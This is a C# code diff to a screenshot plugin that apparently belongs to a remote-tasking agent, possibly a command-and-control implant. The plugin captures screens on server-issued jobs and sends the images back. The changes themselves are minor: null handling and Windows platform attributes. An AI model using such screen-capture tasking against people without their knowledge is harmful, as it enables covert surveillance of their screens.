@@ -18,7 +18,7 @@ namespace Agent
     {
         public string Name => "screenshot";
         private IMessageManager messageManager { get; set; }
-        private System.Timers.Timer screenshotTimer;
+        private System.Timers.Timer? screenshotTimer;
         public CancellationTokenSource cts = new CancellationTokenSource();
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
@@ -26,11 +26,13 @@ namespace Agent
             this.messageManager = messageManager;
         }
 
+        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         public async Task Execute(ServerJob job)
         {
-            int intervalInSeconds = 0; // Default interval should be 0 to just take one
-
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
+            if(args is null){
+                return;
+            }
 
             if (args.interval <= 0)
             {
@@ -60,7 +62,7 @@ namespace Agent
                 });
             }
         }
-
+        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         private async Task CaptureAndSendScreenshot(string task_id)
         {
             try
@@ -123,7 +125,7 @@ namespace Agent
             }
         }
     }
-
+    [System.Runtime.Versioning.SupportedOSPlatform("windows")]
     internal class ScreenCapture
     {
         internal static List<Bitmap> Capture()
